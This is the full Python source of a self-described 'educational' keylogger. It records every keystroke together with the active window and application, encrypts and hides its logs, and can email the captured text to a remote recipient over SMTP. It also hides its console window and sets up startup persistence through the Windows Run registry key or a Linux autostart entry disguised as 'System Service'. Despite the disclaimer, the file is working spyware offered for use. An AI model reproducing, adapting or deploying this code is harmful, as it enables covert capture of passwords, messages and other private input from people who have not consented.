#!/usr/bin/env python3
"""
Educational Keylogger - For Learning and Testing Purposes Only

⚠️  LEGAL DISCLAIMER ⚠️
This keylogger is created for educational purposes and ethical testing only.
- Only use on systems you own or have explicit permission to test
- Using this on others' systems without consent is illegal
- The author is not responsible for misuse of this code

Features:
- Keystroke logging with timestamp
- Special key handling (Space, Enter, Backspace, etc.)
- Stealth mode operation
- Log file encryption
- Email reporting capability
- Persistence mechanism
"""

import os
import sys
import time
import logging
import threading
from datetime import datetime
from pynput.keyboard import Key, Listener
import json
import base64
from cryptography.fernet import Fernet
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import schedule
import subprocess
import platform
try:
    import psutil
except ImportError:
    psutil = None

class StealthKeylogger:
    def __init__(self, config_file="config/config.json"):
        """Initialize the keylogger with configuration"""
        self.config_file = config_file
        self.load_config()
        
        # Initialize logging
        self.setup_logging()
        
        # Initialize encryption
        self.setup_encryption()
        
        # Buffer for keystrokes
        self.keystroke_buffer = []
        self.buffer_lock = threading.Lock()
        
        # Window tracking
        self.current_window = ""
        self.current_app = ""
        self.last_window_check = 0
        
        # Alt key tracking for better window detection
        self._alt_pressed = False
        
        # Running flag
        self.running = True
        
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Keylogger initialized")
    
    def load_config(self):
        """Load configuration from file"""
        default_config = {
            "log_file": "logs/keylog.txt",
            "encrypted_log_file": "logs/keylog.enc",
            "email": {
                "enabled": False,
                "smtp_server": "smtp.gmail.com",
                "smtp_port": 587,
                "sender_email": "",
                "sender_password": "",
                "recipient_email": "",
                "send_interval_hours": 24
            },
            "stealth": {
                "hide_console": True,
                "process_name": "System Service",
                "startup_enabled": False
            },
            "logging": {
                "buffer_size": 100,
                "flush_interval_minutes": 5,
                "log_special_keys": True,
                "log_timestamps": True
            },
            "keylogger": {
                "capture_window_titles": True,
                "capture_application_names": True
            }
        }
        
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    loaded_config = json.load(f)
                    # Merge with defaults
                    self.config = {**default_config, **loaded_config}
            except Exception as e:
                print(f"Error loading config: {e}")
                self.config = default_config
        else:
            self.config = default_config
            self.save_config()
    
    def save_config(self):
        """Save current configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
        except Exception as e:
            print(f"Error saving config: {e}")
    
    def setup_logging(self):
        """Setup logging system"""
        # Ensure logs directory exists
        os.makedirs('logs', exist_ok=True)
        
        log_format = '%(asctime)s - %(levelname)s - %(message)s'
        logging.basicConfig(
            filename='logs/keylogger_system.log',
            level=logging.INFO,
            format=log_format,
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        self.logger = logging.getLogger(__name__)
    
    def setup_encryption(self):
        """Setup encryption for log files"""
        # Ensure logs directory exists
        os.makedirs('logs', exist_ok=True)
        key_file = "logs/encryption.key"
        
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                self.encryption_key = f.read()
        else:
            # Generate new encryption key
            self.encryption_key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(self.encryption_key)
            
            # Hide the key file on Windows
            if platform.system() == "Windows":
                try:
                    subprocess.run(['attrib', '+H', key_file], check=True)
                except:
                    pass
        
        self.cipher_suite = Fernet(self.encryption_key)
    
    def encrypt_data(self, data):
        """Encrypt data using Fernet encryption"""
        try:
            return self.cipher_suite.encrypt(data.encode()).decode()
        except Exception as e:
            self.logger.error(f"Encryption error: {e}")
            return data
    
    def decrypt_data(self, encrypted_data):
        """Decrypt data using Fernet encryption"""
        try:
            return self.cipher_suite.decrypt(encrypted_data.encode()).decode()
        except Exception as e:
            self.logger.error(f"Decryption error: {e}")
            return encrypted_data
    
    def get_active_window_info(self):
        """Get active window title and application name"""
        try:
            system = platform.system()
            
            if system == "Linux":
                # Try multiple methods for Linux
                try:
                    # Method 1: xdotool (most reliable)
                    window_id = subprocess.check_output(['xdotool', 'getactivewindow'], 
                                                      stderr=subprocess.DEVNULL).decode().strip()
                    window_title = subprocess.check_output(['xdotool', 'getwindowname', window_id], 
                                                         stderr=subprocess.DEVNULL).decode().strip()
                    
                    # Get process info
                    pid = subprocess.check_output(['xdotool', 'getwindowpid', window_id], 
                                                stderr=subprocess.DEVNULL).decode().strip()
                    
                    if psutil and pid.isdigit():
                        process = psutil.Process(int(pid))
                        app_name = process.name()
                    else:
                        app_name = "Unknown"
                    
                    return window_title, app_name
                    
                except (subprocess.CalledProcessError, FileNotFoundError):
                    # Method 2: wmctrl as fallback
                    try:
                        output = subprocess.check_output(['wmctrl', '-l'], 
                                                       stderr=subprocess.DEVNULL).decode()
                        active_output = subprocess.check_output(['xprop', '-root', '_NET_ACTIVE_WINDOW'], 
                                                              stderr=subprocess.DEVNULL).decode()
                        window_id = active_output.split()[-1]
                        
                        for line in output.split('\n'):
                            if window_id.lower() in line.lower():
                                parts = line.split(None, 3)
                                if len(parts) >= 4:
                                    return parts[3], "Application"
                        return "Unknown Window", "Unknown App"
                        
                    except (subprocess.CalledProcessError, FileNotFoundError):
                        # Method 3: Simple ps fallback
                        try:
                            output = subprocess.check_output(['ps', 'aux'], 
                                                           stderr=subprocess.DEVNULL).decode()
                            # Look for common GUI applications
                            gui_apps = ['firefox', 'chrome', 'code', 'terminal', 'gedit', 'nautilus']
                            for line in output.split('\n'):
                                for app in gui_apps:
                                    if app in line.lower() and 'grep' not in line:
                                        return f"{app.title()} Window", app
                            return "Terminal", "terminal"
                        except:
                            return "Unknown", "Unknown"
            
            elif system == "Windows":
                try:
                    import win32gui
                    import win32process
                    
                    hwnd = win32gui.GetForegroundWindow()
                    window_title = win32gui.GetWindowText(hwnd)
                    
                    # Get process name
                    _, pid = win32process.GetWindowThreadProcessId(hwnd)
                    if psutil:
                        process = psutil.Process(pid)
                        app_name = process.name()
                    else:
                        app_name = "Unknown"
                    
                    return window_title, app_name
                except ImportError:
                    return "Windows System", "Windows"
            
            elif system == "Darwin":  # macOS
                try:
                    script = '''
                    tell application "System Events"
                        set frontApp to name of first application process whose frontmost is true
                        set frontAppTitle to ""
                        try
                            tell process frontApp
                                set frontAppTitle to title of front window
                            end tell
                        end try
                        return frontApp & "|" & frontAppTitle
                    end tell
                    '''
                    
                    result = subprocess.check_output(['osascript', '-e', script], 
                                                   stderr=subprocess.DEVNULL).decode().strip()
                    parts = result.split('|', 1)
                    app_name = parts[0] if parts else "Unknown"
                    window_title = parts[1] if len(parts) > 1 else "Unknown Window"
                    
                    return window_title, app_name
                except:
                    return "macOS System", "macOS"
            
            else:
                return "Unknown System", "Unknown"
                
        except Exception as e:
            self.logger.error(f"Error getting window info: {e}")
            return "Error", "Error"
    
    def update_window_context(self):
        """Update current window context if enabled"""
        if not (self.config.get('keylogger', {}).get('capture_window_titles', False) or 
                self.config.get('keylogger', {}).get('capture_application_names', False)):
            return
        
        current_time = time.time()
        # Check window more frequently (every 0.5 seconds) for better detection
        if current_time - self.last_window_check < 0.5:
            return
        
        self.last_window_check = current_time
        
        try:
            window_title, app_name = self.get_active_window_info()
            
            # Create context string
            new_context = ""
            if self.config.get('keylogger', {}).get('capture_window_titles', False):
                new_context += window_title
            if self.config.get('keylogger', {}).get('capture_application_names', False):
                if new_context:
                    new_context += f" - {app_name}"
                else:
                    new_context = app_name
            
            # Update current window context (will be logged when buffer flushes)
            if new_context and new_context != getattr(self, 'current_window', ''):
                self.current_window = new_context
                self.current_app = app_name
                    
        except Exception as e:
            self.logger.error(f"Error updating window context: {e}")
    
    def format_keystroke(self, key):
        """Format keystroke for logging with clean, readable output"""
        try:
            # Handle special keys that should be logged but not clutter output
            if key == Key.space:
                return " "  # Just return a space
            elif key == Key.enter:
                return "\n"  # Just return a newline
            elif key == Key.backspace:
                return "[BACKSPACE]"
            elif key == Key.tab:
                return "[TAB]"
            elif key == Key.shift or key == Key.shift_l or key == Key.shift_r:
                return ""  # Don't log shift keys - they're modifier keys
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                return "[CTRL]"
            elif key == Key.alt_l or key == Key.alt_r:
                return "[ALT]"
            elif hasattr(key, 'char') and key.char is not None:
                # Regular character - just return it
                return key.char
            else:
                # Other special keys
                key_name = str(key).replace('Key.', '').upper()
                return f"[{key_name}]"
                
        except Exception as e:
            self.logger.error(f"Error formatting keystroke: {e}")
            return "[ERROR]"
    
    def on_key_press(self, key):
        """Handle key press events"""
        try:
            # Check for window switching indicators and force immediate window update
            force_window_check = False
            
            if key == Key.alt_l or key == Key.alt_r:
                self._alt_pressed = True
                force_window_check = True
            elif key == Key.tab and hasattr(self, '_alt_pressed') and self._alt_pressed:
                # Alt+Tab detected - force immediate window check
                force_window_check = True
            elif key == Key.cmd or key == Key.cmd_l or key == Key.cmd_r:
                # Command key (Mac) - force window check
                force_window_check = True
            elif hasattr(key, 'vk') and key.vk in [91, 92]:  # Windows key
                force_window_check = True
            else:
                # Reset Alt state if other keys pressed
                if key != Key.tab:
                    self._alt_pressed = False
            
            if force_window_check:
                # Force immediate window context update
                self.last_window_check = 0
                self.update_window_context()
                # Also flush buffer to capture application switch
                if self.keystroke_buffer:
                    self.flush_buffer()
            else:
                # Regular window context update
                self.update_window_context()
            
            formatted_key = self.format_keystroke(key)
            
            with self.buffer_lock:
                self.keystroke_buffer.append(formatted_key)
                
                # Flush buffer if it reaches the configured size
                if len(self.keystroke_buffer) >= self.config.get('keylogger', {}).get('buffer_size', 100):
                    self.flush_buffer()
                    
        except Exception as e:
            self.logger.error(f"Error in key press handler: {e}")
    
    def flush_buffer(self):
        """Flush keystroke buffer to file with clean, readable formatting"""
        if not self.keystroke_buffer:
            self.logger.info("Buffer flush called but no keystrokes in buffer")
            return

        try:
            # Store count before processing
            keystroke_count = len(self.keystroke_buffer)
            
            # Join all keystrokes and clean them up
            raw_text = ''.join(self.keystroke_buffer)
            
            # Clean the text by removing extra spaces and fixing special keys
            clean_text = raw_text.replace(' [CTRL] ', ' [CTRL]')
            clean_text = clean_text.replace(' [ALT] ', ' [ALT]')
            clean_text = clean_text.replace(' [BACKSPACE] ', ' [BACKSPACE]')
            clean_text = clean_text.replace(' [TAB] ', ' [TAB]')
            
            # Remove multiple consecutive spaces
            import re
            clean_text = re.sub(r' +', ' ', clean_text)
            
            # Get timestamp
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            short_time = datetime.now().strftime('%H:%M:%S')
            
            # Create the log entry
            log_entry = ""
            
            # Add window context header only if window changed
            if hasattr(self, 'current_window') and self.current_window:
                if not hasattr(self, 'last_logged_window') or self.last_logged_window != self.current_window:
                    log_entry += f"\n🔄 [{timestamp}] Application: {self.current_window}\n"
                    log_entry += "─" * 60 + "\n"
                    self.last_logged_window = self.current_window
            
            # Add clean keystroke text with single timestamp
            if clean_text.strip():
                log_entry += f"[{short_time}] {clean_text.strip()}\n"
            
            # Write to files
            with open(self.config['log_file'], 'a', encoding='utf-8') as f:
                f.write(log_entry)
            
            encrypted_content = self.encrypt_data(log_entry)
            with open(self.config['encrypted_log_file'], 'a', encoding='utf-8') as f:
                f.write(encrypted_content + '\n')
            
            # Clear buffer
            self.keystroke_buffer.clear()
            
            self.logger.info(f"Buffer flushed - {keystroke_count} keystrokes logged")
            
        except Exception as e:
            self.logger.error(f"Error flushing buffer: {e}")
    
    def format_log_for_email(self, log_content):
        """Format log content for clean, readable emails"""
        if not log_content.strip():
            return "No keystrokes captured."
        
        lines = log_content.split('\n')
        formatted_output = []
        current_section = ""
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Handle application context lines
            if line.startswith('🔄') and 'Application:' in line:
                # Add previous section if exists
                if current_section:
                    formatted_output.append(current_section)
                    current_section = ""
                
                # Clean up the application line
                formatted_output.append("")  # Add spacing
                formatted_output.append(line)
                formatted_output.append("─" * 60)
                continue
            
            # Skip separator lines
            if line.startswith('─'):
                continue
            
            # Handle keystroke lines with timestamps
            if line.startswith('[') and '] ' in line:
                # This is a timestamped keystroke line - add it as-is
                formatted_output.append(line)
            else:
                # Other content
                if line:
                    formatted_output.append(line)
        
        return '\n'.join(formatted_output) if formatted_output else "No readable keystrokes found."
    
    def send_email_report(self):
        """Send email report with logs"""
        if not self.config['email']['enabled']:
            return
        
        try:
            # Read log file
            if not os.path.exists(self.config['log_file']):
                return
            
            with open(self.config['log_file'], 'r', encoding='utf-8') as f:
                log_content = f.read()
            
            # Create email
            msg = MIMEMultipart()
            msg['From'] = self.config['email']['sender_email']
            msg['To'] = self.config['email']['recipient_email']
            msg['Subject'] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            # Format log content for better readability
            formatted_content = self.format_log_for_email(log_content[-3000:])  # Last 3000 chars for more context
            
            # Email body
            body = f"""
📊 Educational Keylogger Report
===============================
📅 Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🖥️  System: {platform.system()} {platform.release()}

📝 Captured Keystrokes
----------------------
{formatted_content}

ℹ️  Notes:
• Timestamps shown only when there are time gaps (>10 seconds)
• Special keys shown in <brackets>: <ENTER>, <TAB>, <CTRL>, etc.
• Lines grouped for better readability

🔒 This is an educational demonstration of keystroke monitoring.
            """
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Send email
            server = smtplib.SMTP(self.config['email']['smtp_server'], self.config['email']['smtp_port'])
            server.starttls()
            server.login(self.config['email']['sender_email'], self.config['email']['sender_password'])
            text = msg.as_string()
            server.sendmail(self.config['email']['sender_email'], self.config['email']['recipient_email'], text)
            server.quit()
            
            self.logger.info("Email report sent successfully")
            
            # Clear log file after sending
            open(self.config['log_file'], 'w').close()
            
        except Exception as e:
            self.logger.error(f"Error sending email report: {e}")
    
    def setup_stealth_mode(self):
        """Setup stealth mode features"""
        if not self.config['stealth']['hide_console']:
            return
        
        try:
            if platform.system() == "Windows":
                import ctypes
                # Hide console window
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception as e:
            self.logger.error(f"Error setting up stealth mode: {e}")
    
    def setup_persistence(self):
        """Setup startup persistence"""
        if not self.config['persistence']['startup_enabled']:
            return
        
        try:
            if platform.system() == "Windows":
                # Add to Windows startup registry
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                                   0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
                winreg.CloseKey(key)
            elif platform.system() == "Linux":
                # Add to Linux autostart
                autostart_dir = os.path.expanduser("~/.config/autostart/")
                os.makedirs(autostart_dir, exist_ok=True)
                
                desktop_entry = f"""[Desktop Entry]
Type=Application
Name=System Service
Exec={sys.executable} {os.path.abspath(__file__)}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
                with open(os.path.join(autostart_dir, "system-service.desktop"), 'w') as f:
                    f.write(desktop_entry)
            
            self.logger.info("Persistence setup completed")
        except Exception as e:
            self.logger.error(f"Error setting up persistence: {e}")
    
    def schedule_tasks(self):
        """Schedule recurring tasks"""
        # Schedule buffer flushing
        schedule.every(self.config.get('keylogger', {}).get('flush_interval_minutes', 5)).minutes.do(self.flush_buffer)
        
        # Schedule email reports
        if self.config['email']['enabled']:
            schedule.every(self.config['email']['send_interval_hours']).hours.do(self.send_email_report)
    
    def run_scheduler(self):
        """Run scheduled tasks in background thread"""
        while self.running:
            schedule.run_pending()
            time.sleep(30)  # Check every 30 seconds
    
    def start(self):
        """Start the keylogger"""
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Starting keylogger...")
        
        # Setup stealth mode
        self.setup_stealth_mode()
        
        # Setup persistence
        self.setup_persistence()
        
        # Schedule tasks
        self.schedule_tasks()
        
        # Start scheduler thread
        scheduler_thread = threading.Thread(target=self.run_scheduler, daemon=True)
        scheduler_thread.start()
        
        # Log startup
        self.logger.info("Keylogger started successfully")
        
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Keylogger is running...")
        print("Press Ctrl+C to stop the keylogger")
        
        try:
            # Start listening for keystrokes
            with Listener(on_press=self.on_key_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Keylogger stopped by user")
            self.stop()
        except Exception as e:
            self.logger.error(f"Error in keylogger: {e}")
            print(f"Error: {e}")
    
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        
        # Flush any remaining buffer
        with self.buffer_lock:
            self.flush_buffer()
        
        # Send final email report if email is enabled
        if self.config['email']['enabled']:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Sending final email report...")
            self.send_email_report()
        
        self.logger.info("Keylogger stopped")
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Keylogger stopped")


def main():
    """Main function"""
    print("=" * 60)
    print("Educational Keylogger v1.0")
    print("For Educational and Testing Purposes Only")
    print("=" * 60)
    
    # Create keylogger instance
    keylogger = StealthKeylogger()
    
    # Start keylogger
    keylogger.start()


if __name__ == "__main__":
    main()